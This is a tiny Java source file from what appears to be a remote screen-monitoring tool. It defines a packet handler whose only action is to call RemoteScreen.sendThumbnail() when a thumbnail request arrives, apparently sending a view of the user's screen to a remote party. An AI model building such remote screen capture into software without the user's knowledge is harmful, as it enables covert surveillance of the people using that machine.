package com.redpois0n.packets;

import com.redpois0n.RemoteScreen;

public class PacketTHUMBNAIL extends AbstractPacket{

	@Override
	public void read(String line) throws Exception {
		RemoteScreen.sendThumbnail();
	}

}
